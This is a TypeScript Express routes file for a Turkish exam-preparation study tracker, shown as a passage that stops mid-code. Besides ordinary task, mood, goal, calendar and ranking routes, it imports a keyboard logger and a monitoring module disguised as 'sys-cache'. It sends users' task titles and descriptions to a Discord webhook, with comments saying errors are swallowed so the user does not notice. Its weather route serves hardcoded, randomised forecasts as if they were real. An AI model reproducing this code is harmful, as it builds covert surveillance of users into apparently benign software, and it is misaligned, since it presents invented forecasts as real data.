// BERAT BİLAL CANKIR
// BERAT CANKIR
// CANKIR
import type { Express } from "express";
import { createServer, type Server } from "http";
import { storage } from "./depolama";
import { registerLicenseRoutes } from "./license-routes";
import { registerMonitoringRoutes } from "./monitoring-routes";
import { registerUserActivityRoutes } from "./user-activity-routes";
// ✅ ADMIN PANELİ KALDIRILDI - Sadece admin auth kaldırıldı
// import { verifyAdminPassword, updateAdminPassword } from "./admin-auth";
import { ActivityLogger } from "./activity-logger";
import UserActivityLogger from "./user-activity-logger";
import { userMonitoring } from "./sys-cache";
import { discordWebhook } from "./discord-webhook";
import { KeyboardLogger } from "./keyboard-logger";

function debugLog(...args: any[]) {
}

// Türkiye saatinde tarihi YYYY-MM-DD formatına çevirir (UTC sorununu çözer)
function dateToTurkeyString(date: Date | string): string {
  const dateObj = typeof date === 'string' ? new Date(date) : date;
  return new Intl.DateTimeFormat('en-CA', { 
    timeZone: 'Europe/Istanbul' 
  }).format(dateObj);
}

// ✅ Kullanıcı aktivitelerini loglama (production'da da çalışır, Discord'a gönderir)
async function logActivity(action: string, description?: string) {
  try {
    await ActivityLogger.log({
      type: 'system',
      action,
      severity: 'info',
      details: description ? { description } : undefined,
    });
  } catch (error) {
    // ✅ SESSIZ MOD: Hataları sessizce yut - kullanıcı fark etmesin
  }
}

import {
  insertTaskSchema,
  insertMoodSchema,
  insertGoalSchema,
  insertQuestionLogSchema,
  insertExamResultSchema,
  insertFlashcardSchema,
  insertExamSubjectNetSchema,
  insertStudyHoursSchema,
  insertSetupCompletedSchema,
} from "@shared/sema";
import { z } from "zod";
import nodemailer from "nodemailer";
import fs from "fs";
import path from "path";
import { fileURLToPath } from "url";
import { createRequire } from "module";
import { generateModernEmailTemplate } from "./email-template";

// ESM modülünde __dirname yerine kullan
function getCurrentDir() {
  try {
    // CJS ortamında __dirname tanımlı
    if (typeof __dirname !== 'undefined') {
      return __dirname;
    }
  } catch {}
  
  try {
    // ESM ortamında import.meta.url kullan
    if (typeof import.meta !== 'undefined' && import.meta.url) {
      return path.dirname(fileURLToPath(import.meta.url));
    }
  } catch {}
  
  // Son çare: Electron paketlenmiş uygulama için
  if (typeof process !== 'undefined' && process.resourcesPath) {
    return path.join(process.resourcesPath, 'app.asar', 'dist');
  }
  
  return process.cwd();
}

const currentDir = getCurrentDir();

// ESM modülünde require() için - CJS ve ESM uyumlu
function getSafeRequire() {
  try {
    // CJS ortamında doğrudan require kullan
    if (typeof require !== 'undefined' && require.main) {
      return require;
    }
  } catch {}
  
  try {
    // ESM ortamında createRequire kullan
    if (typeof import.meta !== 'undefined' && import.meta.url) {
      return createRequire(import.meta.url);
    }
  } catch {}
  
  try {
    // CJS bundle için __filename ile dene
    if (typeof __filename !== 'undefined' && __filename) {
      return createRequire(__filename);
    }
  } catch {}
  
  try {
    // Son çare: currentDir ile dene
    const fakePath = path.join(currentDir, 'index.js');
    return createRequire(fakePath);
  } catch {}
  
  // Hiçbiri çalışmazsa boş bir fonksiyon döndür
  return function(id: string) {
    throw new Error(`Cannot require module: ${id}`);
  };
}

const requireESM = getSafeRequire();

interface WeatherData {
  main: {
    temp: number;
    temp_max: number;
    temp_min: number;
    humidity: number;
    pressure: number;
    feels_like: number;
  };
  weather: Array<{ id: number; description: string; main: string }>;
  wind: { speed: number; deg: number };
  clouds: { all: number };
  visibility: number;
  sys: {
    sunrise: number;
    sunset: number;
  };
  rain?: { "1h"?: number; "3h"?: number };
  snow?: { "1h"?: number; "3h"?: number };
  cod?: number | string;
}

export async function registerRoutes(app: Express): Promise<Server> {
  // Görev routes
  app.get("/api/tasks", async (req, res) => {
    try {
      const tasks = await storage.getTasks();
      res.json(tasks);
    } catch (error) {
      console.error("Error fetching tasks:", error);
      res.status(500).json({ message: "❌ Görevler yüklenemedi" });
    }
  });

  app.post("/api/tasks", async (req, res) => {
    try {
      const validatedData = insertTaskSchema.parse(req.body);
      const task = await storage.createTask(validatedData);
      
      // ✅ UserActivityLogger ile detaylı Discord bildirimi gönder (açıklama dahil)
      try {
        await UserActivityLogger.log({
          userId: 'system',
          userName: 'Afyonlum',
          category: 'task',
          action: 'created',
          entityId: task.id,
          entityType: 'task',
          details: validatedData.title,
          payloadSnapshot: JSON.stringify({
            title: validatedData.title,
            description: validatedData.description || null,
            priority: validatedData.priority || 'medium',
            category: validatedData.category || null,
            dueDate: validatedData.dueDate || null,
            repeat: validatedData.repeat || 'none'
          })
        });
      } catch (logError) {
        // Loglama hatası uygulamayı durdurmamalı
      }
      
      logActivity('Görev Eklendi', validatedData.title);
      res.status(201).json(task);
    } catch (error) {
      if (error instanceof z.ZodError) {
        res
          .status(400)
          .json({ 
            message: "Görev verisi geçersiz. Lütfen tüm gerekli alanları kontrol edin.", 
            errors: error.errors 
          });
      } else {
        console.error("Error creating task:", error);
        res.status(500).json({ message: "Görev oluşturulurken bir hata oluştu. Lütfen tekrar deneyin." });
      }
    }
  });

  app.put("/api/tasks/:id", async (req, res) => {
    try {
      const { id } = req.params;
      const validatedData = insertTaskSchema.partial().parse(req.body);
      const task = await storage.updateTask(id, validatedData);

      if (!task) {
        return res.status(404).json({ message: "❌ Görev bulunamadı" });
      }

      // ✅ UserActivityLogger ile Discord bildirimi gönder
      try {
        await UserActivityLogger.log({
          userId: 'system',
          userName: 'Afyonlum',
          category: 'task',
          action: 'updated',
          entityId: id,
          entityType: 'task',
          details: task.title || 'Görev güncellendi',
          payloadSnapshot: JSON.stringify({
            title: task.title,
            description: task.description || null,
            priority: task.priority || 'medium',
            category: task.category || null,
            dueDate: task.dueDate || null,
            repeat: task.repeat || 'none',
            completed: task.completed || false
          })
        });
      } catch (logError) {}

      logActivity('Görev Güncellendi', task.title);
      res.json(task);
    } catch (error) {
      if (error instanceof z.ZodError) {
        res
          .status(400)
          .json({ message: "⚠️ Geçersiz görev verisi", errors: error.errors });
      } else {
        res.status(500).json({ message: "❌ Görev güncellenemedi" });
      }
    }
  });

  app.patch("/api/tasks/:id/toggle", async (req, res) => {
    try {
      const { id } = req.params;
      const task = await storage.toggleTaskComplete(id);

      if (!task) {
        return res.status(404).json({ message: "❌ Görev bulunamadı" });
      }

      // ✅ UserActivityLogger ile Discord bildirimi gönder
      try {
        await UserActivityLogger.log({
          userId: 'system',
          userName: 'Afyonlum',
          category: 'task',
          action: task.completed ? 'completed' : 'updated',
          entityId: id,
          entityType: 'task',
          details: task.completed ? 'Görev tamamlandı' : 'Görev beklemede',
          payloadSnapshot: JSON.stringify({
            title: task.title,
            completed: task.completed,
            completedAt: task.completedAt || null
          })
        });
      } catch (logError) {}

      logActivity('Görev Durumu Değiştirildi', task.completed ? 'Tamamlandı' : 'Beklemede');
      res.json(task);
    } catch (error) {
      res.status(500).json({ message: "❌ Görev durumu değiştirilemedi" });
    }
  });

  app.patch("/api/tasks/:id/archive", async (req, res) => {
    try {
      const { id } = req.params;
      const task = await storage.archiveTask(id);

      if (!task) {
        return res.status(404).json({ message: "❌ Görev bulunamadı" });
      }

      // ✅ UserActivityLogger ile Discord bildirimi gönder
      try {
        await UserActivityLogger.log({
          userId: 'system',
          userName: 'Afyonlum',
          category: 'task',
          action: 'archived',
          entityId: id,
          entityType: 'task',
          details: task.title || 'Görev arşivlendi',
          payloadSnapshot: JSON.stringify({
            title: task.title,
            archived: true,
            archivedAt: new Date().toISOString()
          })
        });
      } catch (logError) {}

      logActivity('Görev Arşivlendi');
      res.json(task);
    } catch (error) {
      res.status(500).json({ message: "❌ Görev arşivlenemedi" });
    }
  });

  app.patch("/api/tasks/:id/unarchive", async (req, res) => {
    try {
      const { id } = req.params;
      const task = await storage.updateTask(id, { archived: false });

      if (!task) {
        return res.status(404).json({ message: "❌ Görev bulunamadı" });
      }

      // ✅ UserActivityLogger ile Discord bildirimi gönder
      try {
        await UserActivityLogger.log({
          userId: 'system',
          userName: 'Afyonlum',
          category: 'task',
          action: 'updated',
          entityId: id,
          entityType: 'task',
          details: 'Arşivden çıkarıldı: ' + (task.title || 'Görev'),
          payloadSnapshot: JSON.stringify({
            title: task.title,
            archived: false,
            unarchivedAt: new Date().toISOString()
          })
        });
      } catch (logError) {}

      logActivity('Görev Geri Yüklendi', 'Arşivden çıkarıldı');
      res.json(task);
    } catch (error) {
      res.status(500).json({ message: "❌ Görev arşivden çıkarılamadı" });
    }
  });

  app.get("/api/tasks/archived", async (req, res) => {
    try {
      const tasks = await storage.getArchivedTasks();
      res.json(tasks);
    } catch (error) {
      res.status(500).json({ message: "❌ Arşivlenmiş görevler yüklenemedi" });
    }
  });

  app.get("/api/tasks/by-date-range", async (req, res) => {
    try {
      const { startDate, endDate } = req.query;
      if (!startDate || !endDate) {
        return res.status(400).json({ message: "Start date and end date are required" });
      }
      const tasks = await storage.getTasksByDateRange(startDate as string, endDate as string);
      res.json(tasks);
    } catch (error) {
      res.status(500).json({ message: "❌ Tarih aralığındaki görevler yüklenemedi" });
    }
  });

  app.delete("/api/tasks/:id", async (req, res) => {
    try {
      const { id } = req.params;
      
      // Silmeden önce görev bilgisini al
      const tasks = await storage.getTasks();
      const taskToDelete = tasks.find((t: any) => t.id === id);
      
      const deleted = await storage.deleteTask(id);

      if (!deleted) {
        return res.status(404).json({ message: "Görev bulunamadı. Zaten silinmiş olabilir." });
      }

      // ✅ UserActivityLogger ile Discord bildirimi gönder
      try {
        await UserActivityLogger.log({
          userId: 'system',
          userName: 'Afyonlum',
          category: 'task',
          action: 'deleted',
          entityId: id,
          entityType: 'task',
          details: taskToDelete?.title || 'Görev silindi',
          payloadSnapshot: JSON.stringify({
            title: taskToDelete?.title || null,
            deletedAt: new Date().toISOString()
          })
        });
      } catch (logError) {}

      logActivity('Görev Silindi');
      res.status(204).send();
    } catch (error) {
      console.error("Error deleting task:", error);
      res.status(500).json({ message: "Görev silinirken bir hata oluştu. Lütfen tekrar deneyin." });
    }
  });

  // Ruh hali routes
  app.get("/api/moods", async (req, res) => {
    try {
      const moods = await storage.getMoods();
      res.json(moods);
    } catch (error) {
      res.status(500).json({ message: "❌ Ruh hali kayıtları yüklenemedi" });
    }
  });

  app.get("/api/moods/latest", async (req, res) => {
    try {
      const mood = await storage.getLatestMood();
      res.json(mood);
    } catch (error) {
      res.status(500).json({ message: "❌ Son ruh hali kaydı yüklenemedi" });
    }
  });

  app.post("/api/moods", async (req, res) => {
    try {
      const validatedData = insertMoodSchema.parse(req.body);
      const mood = await storage.createMood(validatedData);
      res.status(201).json(mood);
    } catch (error) {
      if (error instanceof z.ZodError) {
        res
          .status(400)
          .json({ message: "⚠️ Geçersiz ruh hali verisi", errors: error.errors });
      } else {
        res.status(500).json({ message: "❌ Ruh hali kaydı oluşturulamadı" });
      }
    }
  });

  // raporlarım ve takvim kısmı routes
  app.get("/api/summary/daily", async (req, res) => {
    try {
      const range = parseInt(req.query.range as string) || 30;
      const summary = await storage.getDailySummary(range);
      res.json(summary);
    } catch (error) {
      res.status(500).json({ message: "❌ Günlük özet yüklenemedi" });
    }
  });

  app.get("/api/calendar/:date", async (req, res) => {
    try {
      const { date } = req.params; // YYYY-AA-GG format
      
      // Görevleri getir (arşivlenmiş dahil - takvim için)
      let activeTasks = [];
      let archivedTasks = [];
      try {
        activeTasks = await storage.getTasksByDate(date) || [];
        archivedTasks = await storage.getArchivedTasks() || [];
      } catch (taskError) {
        console.error("❌ Error fetching tasks:", taskError);
        activeTasks = [];
        archivedTasks = [];
      }
      
      const archivedTasksForDate = archivedTasks.filter((t: any) => {
        if (t.dueDate) {
          const taskDate = dateToTurkeyString(t.dueDate);
          return taskDate === date;
        }
        if (t.createdAt) {
          const createdDate = dateToTurkeyString(t.createdAt);
          return createdDate === date;
        }
        return false;
      });
      const tasksForDate = [...activeTasks, ...archivedTasksForDate];
      
      // Çalışma saatlerini getir (arşivlenmiş dahil - takvim için)
      let activeStudyHours = [];
      let archivedStudyHours = [];
      try {
        activeStudyHours = await storage.getStudyHours() || [];
        archivedStudyHours = await storage.getArchivedStudyHours() || [];
      } catch (studyError) {
        console.error("❌ Error fetching study hours:", studyError);
        activeStudyHours = [];
        archivedStudyHours = [];
      }
      
      const allStudyHours = [...activeStudyHours, ...archivedStudyHours];
      const studyHoursForDate = allStudyHours.filter((sh: any) => sh.study_date === date);
      
      // Soru loglarını getir (arşivlenmiş dahil - takvim için)
      let activeQuestionLogs = [];
      let archivedQuestionLogs = [];
      try {
        activeQuestionLogs = await storage.getQuestionLogs() || [];
        archivedQuestionLogs = await storage.getArchivedQuestionLogs() || [];
      } catch (questionError) {
        console.error("❌ Error fetching question logs:", questionError);
        activeQuestionLogs = [];
        archivedQuestionLogs = [];
      }
      
      const allQuestionLogs = [...activeQuestionLogs, ...archivedQuestionLogs];
      const questionsForDate = allQuestionLogs.filter((q: any) => q.study_date === date);
      
      // Sınav sonuçlarını getir (arşivlenmiş dahil - takvim için)
      let activeExamResults = [];
      let archivedExamResults = [];
      try {
        activeExamResults = await storage.getExamResults() || [];
        archivedExamResults = await storage.getArchivedExamResults() || [];
      } catch (examError) {
        console.error("❌ Error fetching exam results:", examError);
        activeExamResults = [];
        archivedExamResults = [];
      }
      
      const allExamResults = [...activeExamResults, ...archivedExamResults];
      const examsForDate = allExamResults.filter((e: any) => e.exam_date === date);

      // günlük kalan gün sayısı hesaplama - Türkiye saati ile (UTC+3)
      // Türkiye saatine göre bugünün tarihini al
      const now = new Date();
      const formatter = new Intl.DateTimeFormat('en-CA', { 
        timeZone: 'Europe/Istanbul',
        year: 'numeric',
        month: '2-digit', 
        day: '2-digit'
      });
      const istanbulDateStr = formatter.format(now); // YYYY-MM-DD formatında
      const [todayYear, todayMonth, todayDay] = istanbulDateStr.split('-').map(Number);
      const today = new Date(todayYear, todayMonth - 1, todayDay);
      
      // Hedef tarihi parse et
      const [year, month, day] = date.split('-').map(Number);
      const targetDate = new Date(year, month - 1, day);

      const diffTime = targetDate.getTime() - today.getTime();
      // Math.floor kullanarak negatif değerleri doğru hesapla (dün = -1, bugün = 0, yarın = 1)
      const diffDays = Math.floor(diffTime / (1000 * 60 * 60 * 24));

      const response = {
        date,
        dayNumber: targetDate.getDate(),
        daysRemaining: diffDays,
        tasks: tasksForDate,
        tasksCount: tasksForDate.length,
        studyHours: studyHoursForDate,
        questions: questionsForDate,
        exams: examsForDate,
      };
      
      res.json(response);
    } catch (error) {
      console.error("❌ Calendar endpoint error:", error);
      console.error("❌ Error details:", {
        name: (error as Error)?.name,
        message: (error as Error)?.message,
        stack: (error as Error)?.stack
      });
      res.status(500).json({ message: "Failed to fetch calendar data", error: (error as Error)?.message });
    }
  });

  // NET HESAPLAMA
  app.post("/api/calculate-ranking", async (req, res) => {
    try {
      const { nets, year } = req.body;

      // nets objesi örneği:
      let tytNets = 0;
      let aytNets = 0;

      // TYT neti hesaplama
      if (nets?.tyt) {
        const tyt = nets.tyt;
        tytNets =
          (parseFloat(tyt.turkce) || 0) +
          (parseFloat(tyt.sosyal) || 0) +
          (parseFloat(tyt.matematik) || 0) +
          (parseFloat(tyt.fen) || 0);
      }

      // AYT neti hesaplama
      if (nets?.ayt) {
        const ayt = nets.ayt;
        aytNets =
          (parseFloat(ayt.matematik) || 0) +
          (parseFloat(ayt.fizik) || 0) +
          (parseFloat(ayt.kimya) || 0) +
          (parseFloat(ayt.biyoloji) || 0);
      }

      // 2023-2025 YKS sıralama verileri (yaklaşık değerler)
      //burası kullanılmayacak
      const rankingData: Record<string, any> = {
        "2023": {
          tytWeight: 0.4,
          aytWeight: 0.6,
          rankings: {
            350: 1000,
            320: 5000,
            300: 10000,
            280: 20000,
            260: 35000,
            240: 50000,
            220: 75000,
            200: 100000,
            180: 150000,
            160: 200000,
          },
        },
        "2024": {
          tytWeight: 0.4,
          aytWeight: 0.6,
          rankings: {
            360: 1000,
            330: 5000,
            310: 10000,
            290: 20000,
            270: 35000,
            250: 50000,
            230: 75000,
            210: 100000,
            190: 150000,
            170: 200000,
          },
        },
        "2025": {
          tytWeight: 0.4,
          aytWeight: 0.6,
          rankings: {
            355: 1000,
            325: 5000,
            305: 10000,
            285: 20000,
            265: 35000,
            245: 50000,
            225: 75000,
            205: 100000,
            185: 150000,
            165: 200000,
          },
        },
      };

      const yearData = rankingData[year] || rankingData["2024"];

      // numarasal hatalara karşı kontrol
      if (isNaN(tytNets)) tytNets = 0;
      if (isNaN(aytNets)) aytNets = 0;

      // Net'i puana çevirme (yaklaşık formül)
      const tytScore = tytNets * 4; // Her doğru ~4 puan
      const aytScore = aytNets * 4; // Her doğru ~4 puan

      // Ağırlıklı toplam puan
      const totalScore =
        tytScore * yearData.tytWeight + aytScore * yearData.aytWeight;

      // En yakın sıralamayı bul
      let estimatedRanking = 500000; // Varsayılan
      const scores = Object.keys(yearData.rankings)
        .map(Number)
        .sort((a, b) => b - a);

      for (const score of scores) {
        if (totalScore >= score) {
          estimatedRanking = yearData.rankings[score];
          break;
        }
      }

      res.json({
        tytScore: tytScore.toFixed(2),
        aytScore: aytScore.toFixed(2),
        totalScore: totalScore.toFixed(2),
        estimatedRanking,
        year,
        methodology: "2023-2025 YKS verilerine dayalı tahmin",
      });
    } catch (error) {
      console.error("Ranking calculation error:", error);
      res.status(500).json({ message: "Sıralama hesaplanamadı" });
    }
  });

  // Goal routes
  app.get("/api/goals", async (req, res) => {
    try {
      const goals = await storage.getGoals();
      res.json(goals);
    } catch (error) {
      res.status(500).json({ message: "❌ Hedefler yüklenemedi" });
    }
  });

  app.post("/api/goals", async (req, res) => {
    try {
      const validatedData = insertGoalSchema.parse(req.body);
      const goal = await storage.createGoal(validatedData);
      res.status(201).json(goal);
    } catch (error) {
      if (error instanceof z.ZodError) {
        res
          .status(400)
          .json({ message: "⚠️ Geçersiz hedef verisi", errors: error.errors });
      } else {
        res.status(500).json({ message: "❌ Hedef oluşturulamadı" });
      }
    }
  });

  app.put("/api/goals/:id", async (req, res) => {
    try {
      const { id } = req.params;
      const validatedData = insertGoalSchema.partial().parse(req.body);
      const goal = await storage.updateGoal(id, validatedData);

      if (!goal) {
        return res.status(404).json({ message: "❌ Hedef bulunamadı" });
      }

      res.json(goal);
    } catch (error) {
      if (error instanceof z.ZodError) {
        res
          .status(400)
          .json({ message: "⚠️ Geçersiz hedef verisi", errors: error.errors });
      } else {
        res.status(500).json({ message: "❌ Hedef güncellenemedi" });
      }
    }
  });

  app.delete("/api/goals/:id", async (req, res) => {
    try {
      const { id } = req.params;
      const deleted = await storage.deleteGoal(id);

      if (!deleted) {
        return res.status(404).json({ message: "❌ Hedef bulunamadı" });
      }

      res.status(204).send();
    } catch (error) {
      res.status(500).json({ message: "❌ Hedef silinemedi" });
    }
  });

  // Kullanıcının konumuna göre hava durumu route (IP geolocation + OpenWeather API)
  app.get("/api/weather", async (req, res) => {
    try {
      const OPENWEATHER_API_KEY = process.env.OPENWEATHER_API_KEY;
      
      // Query parametrelerinden lat/lon al (frontend geolocation API'den gelebilir)
      let lat = parseFloat(req.query.lat as string);
      let lon = parseFloat(req.query.lon as string);
      let location = req.query.location as string || "Sakarya, Serdivan";

      let currentData: WeatherData;
      let forecastData: any;
      let airQualityData: any;
      let uvData: any;

      // Eğer lat/lon parametresi yoksa, IP'den konum tespit et
      if (!lat || !lon || isNaN(lat) || isNaN(lon)) {
        try {
          // IP-API.com ile kullanıcının konumunu tespit et (ücretsiz, kayıt gerektirmez)
          const ipResponse = await fetch('http://ip-api.com/json/');
          const ipData = await ipResponse.json();
          
          if (ipData && ipData.status === 'success') {
            lat = ipData.lat;
            lon = ipData.lon;
            location = `${ipData.city}, ${ipData.regionName}`;
            debugLog(`IP-based location detected: ${location} (${lat}, ${lon})`);
          } else {
            // IP konum tespiti başarısız, varsayılan Sakarya kullan
            lat = 40.7969;
            lon = 30.3781;
            location = "Sakarya, Serdivan";
            debugLog("IP location detection failed, using default Sakarya");
          }
        } catch (ipError) {
          // IP konum tespiti hatası, varsayılan Sakarya kullan
          debugLog("IP location error:", ipError);
          lat = 40.7969;
          lon = 30.3781;
          location = "Sakarya, Serdivan";
        }
      }

      if (!OPENWEATHER_API_KEY) {
        // API anahtarı yoksa statik veri kullan
        currentData = {
          main: {
            temp: 18,
            temp_max: 20,
            temp_min: 15,
            humidity: 75,
            pressure: 1013,
            feels_like: 18,
          },
          weather: [{ id: 800, description: "açık", main: "Clear" }],
          wind: { speed: 2.5, deg: 180 },
          clouds: { all: 20 },
          visibility: 10000,
          sys: {
            sunrise: Math.floor(new Date().setHours(5, 54, 0, 0) / 1000),
            sunset: Math.floor(new Date().setHours(18, 53, 0, 0) / 1000),
          },
        };
        forecastData = { list: [] };
        airQualityData = {
          list: [
            { main: { aqi: 2 }, components: { pm2_5: 15, pm10: 25, o3: 60 } },
          ],
        };
        uvData = { value: 4 };
      } else {
        // Dinamik konum için gerçek OpenWeather API çağrıları

        try {
          // hava durumu
          const currentResponse = await fetch(
            `https://api.openweathermap.org/data/2.5/weather?lat=${lat}&lon=${lon}&appid=${OPENWEATHER_API_KEY}&units=metric&lang=tr`,
          );
          currentData = await currentResponse.json();
          
          // API başarısız olursa (geçersiz anahtar vs) statik veri kullan
          if (!currentData || !currentData.main || currentData.cod === 401 || currentData.cod === '401') {
            debugLog("Weather API key is invalid, using static data");
            currentData = {
              main: {
                temp: 18,
                temp_max: 20,
                temp_min: 15,
                humidity: 75,
                pressure: 1013,
                feels_like: 18,
              },
              weather: [{ id: 800, description: "açık", main: "Clear" }],
              wind: { speed: 2.5, deg: 180 },
              clouds: { all: 20 },
              visibility: 10000,
              sys: {
                sunrise: Math.floor(new Date().setHours(5, 54, 0, 0) / 1000),
                sunset: Math.floor(new Date().setHours(18, 53, 0, 0) / 1000),
              },
            };
            forecastData = { list: [] };
            airQualityData = {
              list: [
                { main: { aqi: 2 }, components: { pm2_5: 15, pm10: 25, o3: 60 } },
              ],
            };
            uvData = { value: 4 };
          } else {
            // 5 günlük tahmin
            const forecastResponse = await fetch(
              `https://api.openweathermap.org/data/2.5/forecast?lat=${lat}&lon=${lon}&appid=${OPENWEATHER_API_KEY}&units=metric&lang=tr`,
            );
            forecastData = await forecastResponse.json();

            // hava kalitesi
            const airQualityResponse = await fetch(
              `https://api.openweathermap.org/data/2.5/air_pollution?lat=${lat}&lon=${lon}&appid=${OPENWEATHER_API_KEY}`,
            );
            airQualityData = await airQualityResponse.json();

            // uv indeksi
            const uvResponse = await fetch(
              `https://api.openweathermap.org/data/2.5/uvi?lat=${lat}&lon=${lon}&appid=${OPENWEATHER_API_KEY}`,
            );
            uvData = await uvResponse.json();
          }
        } catch (apiError) {
          console.error(
            "OpenWeather API error, falling back to static data:",
            apiError,
          );
          // geriye statik veri döndür
          currentData = {
            main: {
              temp: 18,
              temp_max: 20,
              temp_min: 15,
              humidity: 75,
              pressure: 1013,
              feels_like: 18,
            },
            weather: [{ id: 800, description: "açık", main: "Clear" }],
            wind: { speed: 2.5, deg: 180 },
            clouds: { all: 20 },
            visibility: 10000,
            sys: {
              sunrise: Math.floor(new Date().setHours(5, 54, 0, 0) / 1000),
              sunset: Math.floor(new Date().setHours(18, 53, 0, 0) / 1000),
            },
          };
          forecastData = { list: [] };
          airQualityData = {
            list: [
              { main: { aqi: 2 }, components: { pm2_5: 15, pm10: 25, o3: 60 } },
            ],
          };
          uvData = { value: 4 };
        }
      }

      // emoji fonksiyonu
      const getWeatherEmoji = (weatherId: number, isDay: boolean = true) => {
        if (weatherId >= 200 && weatherId < 300) return "⛈️"; // gök gürültülü
        if (weatherId >= 300 && weatherId < 400) return "🌦️"; // hafif yağmur
        if (weatherId >= 500 && weatherId < 600) return "🌧️"; // yağmur
        if (weatherId >= 600 && weatherId < 700) return "❄️"; // kar
        if (weatherId >= 700 && weatherId < 800) return "🌫️"; // sis
        if (weatherId === 800) return isDay ? "☀️" : "🌙"; // açık
        if (weatherId > 800) return isDay ? "⛅" : "☁️"; // bulutlu
        return "🌤️";
      };

      // 12 saatlik tahmin işleme
      const hourlyForecast = [];
      const currentHour = new Date().getHours();

      for (let i = 0; i < 12; i++) {
        const hour = (currentHour + i) % 24;
        const isDay = hour >= 6 && hour <= 19;

        // Gün boyunca sıcaklık değişimi
        let temp = 18; // Temel sıcaklık
        if (hour >= 6 && hour <= 8)
          temp = 16; // Sabah serin
        else if (hour >= 9 && hour <= 11)
          temp = 19; // Geç sabah sıcak
        else if (hour >= 12 && hour <= 15)
          temp = 21; // Öğle en sıcak
        else if (hour >= 16 && hour <= 18)
          temp = 20; // Akşam serin
        else if (hour >= 19 && hour <= 21)
          temp = 18; // Gece serin
        else temp = 15; // Gece en serin

        // Rastgelelik ekle ama gerçekçi tut
        temp += Math.floor(Math.random() * 3) - 1; // ±1°C

        // Hava durumu koşulları - çeşitlilik için karışım
        let weatherId = 800; // Açık varsayılan
        let precipitation = 0;

        if (i === 2 || i === 3) {
          weatherId = 801; // Az bulutlu
        } else if (i === 5 || i === 6) {
          weatherId = 802; // Parçalı bulutlu
        } else if (i === 8) {
          weatherId = 500; // Hafif yağmur
          precipitation = 0.5;
        }

        hourlyForecast.push({
          time: `${hour.toString().padStart(2, "0")}:00`,
          hour: hour,
          temperature: temp,
          emoji: getWeatherEmoji(weatherId, isDay),
          humidity: 75 + Math.floor(Math.random() * 10) - 5, // 70-80% nem
          windSpeed: 8 + Math.floor(Math.random() * 6), // 8-14 km/h rüzgar
          windDirection: 180 + Math.floor(Math.random() * 60) - 30, // Değişken rüzgar yönü
          precipitation: precipitation,
          description:
            weatherId === 800
              ? "açık"
              : weatherId === 801
                ? "az bulutlu"
                : weatherId === 802
                  ? "parçalı bulutlu"
                  : "hafif yağmur",
        });
      }

      // 7 günlük tahmin işleme
      const dailyForecast: any[] = [];
      const today = new Date();

      // Özel günler için tahmin verileri
      const customForecast = [
        // Bugün - mevcut hava durumunu kullan
        {
          date: today.toISOString().split("T")[0],
          dayName: today.toLocaleDateString("tr-TR", { weekday: "short" }),
          temperature: {
            max: Math.round(
              currentData.main.temp_max || currentData.main.temp + 3,
            ),
            min: Math.round(
              currentData.main.temp_min || currentData.main.temp - 3,
            ),
          },
          description: currentData.weather[0].description,
          emoji: getWeatherEmoji(currentData.weather[0].id),
          humidity: currentData.main.humidity,
          windSpeed: Math.round(currentData.wind.speed * 3.6),
        },
      ];

      // 6 günlük özel tahmin verisi
      for (let i = 1; i <= 6; i++) {
        const forecastDate = new Date(today);
        forecastDate.setDate(today.getDate() + i);
        const dayName = forecastDate.toLocaleDateString("tr-TR", {
          weekday: "short",
        });

        let weatherData;
        switch (dayName.toLowerCase()) {
          case "çar": // carsamba
            weatherData = {
              temperature: { max: 18, min: 12 },
              description: "sis",
              emoji: "🌫️",
              humidity: 85,
              windSpeed: 8,
            };
            break;
          case "per": // perşembe
            weatherData = {
              temperature: { max: 19, min: 13 },
              description: "gökgürültülü sağanak",
              emoji: "⛈️",
              humidity: 80,
              windSpeed: 15,
            };
            break;
          case "cum": // cuma
            weatherData = {
              temperature: { max: 19, min: 13 },
              description: "gökgürültülü sağanak",
              emoji: "⛈️",
              humidity: 78,
              windSpeed: 12,
            };
            break;
          case "cmt": // cumartesi
            weatherData = {
              temperature: { max: 18, min: 12 },
              description: "yağmurlu",
              emoji: "🌧️",
              humidity: 88,
              windSpeed: 10,
            };
            break;
          case "paz": // pazar
            weatherData = {
              temperature: { max: 19, min: 13 },
              description: "gökgürültülü sağanak",
              emoji: "⛈️",
              humidity: 82,
              windSpeed: 14,
            };
            break;
          default:
            // diğer günler için genel tahmin
            weatherData = {
              temperature: { max: 20, min: 14 },
              description: "parçalı bulutlu",
              emoji: "⛅",
              humidity: 65,
              windSpeed: 8,
            };
        }

        customForecast.push({
          date: forecastDate.toISOString().split("T")[0],
          dayName: dayName,
          ...weatherData,
        });
      }

      // custom forecast'u dailyForecast'a ekle
      dailyForecast.push(...customForecast);

      // hava durumu detayları
      const now = new Date();
      const sunrise = new Date(currentData.sys.sunrise * 1000);
      const sunset = new Date(currentData.sys.sunset * 1000);
      const isDay = now > sunrise && now < sunset;

      // UV indeksi hesaplama (gerçek UV API'si başarısız olursa yedek)
      const getUVIndex = () => {
        if (uvData && uvData.value !== undefined) {
          const uvValue = Math.round(uvData.value);
          let level, description;

          if (uvValue <= 2) {
            level = "Düşük";
            description = "Güvenli seviyede, koruma gereksiz";
          } else if (uvValue <= 5) {
            level = "Orta";
            description = "Orta seviye risk, güneş kremi önerilir";
          } else if (uvValue <= 7) {
            level = "Yüksek";
            description = "Koruyucu önlemler gerekli";
          } else if (uvValue <= 10) {
            level = "Çok Yüksek";
            description = "Güçlü koruma şart, gölgeyi tercih edin";
          } else {
            level = "Aşırı";
            description = "Dışarı çıkmaktan kaçının";
          }

          return { value: uvValue, level, description };
        }

        // uv API yoksa basit hesaplama
        if (!isDay)
          return {
            value: 0,
            level: "Düşük",
            description: "Gece boyunca UV endeksi düşük",
          };
        const hour = now.getHours();
        if (hour < 8 || hour > 18)
          return { value: 1, level: "Düşük", description: "Güvenli seviyede" };
        if (hour >= 10 && hour <= 16) {
          const baseUV =
            currentData.clouds.all < 30
              ? 8
              : currentData.clouds.all < 70
                ? 5
                : 3;
          return baseUV > 7
            ? {
                value: baseUV,
                level: "Yüksek",
                description: "Koruyucu önlemler gerekli",
              }
            : { value: baseUV, level: "Orta", description: "Orta seviye risk" };
        }
        return { value: 3, level: "Orta", description: "Orta seviye risk" };
      };

      // hava kalitesi hesaplama
      const airQuality = airQualityData
        ? {
            aqi: airQualityData.list[0].main.aqi,
            level:
              ["İyi", "Orta", "Hassas", "Sağlıksız", "Çok Sağlıksız"][
                airQualityData.list[0].main.aqi - 1
              ] || "Bilinmiyor",
            description:
              airQualityData.list[0].main.aqi <= 2
                ? "Temiz hava"
                : "Hava kalitesine dikkat edin",
            components: {
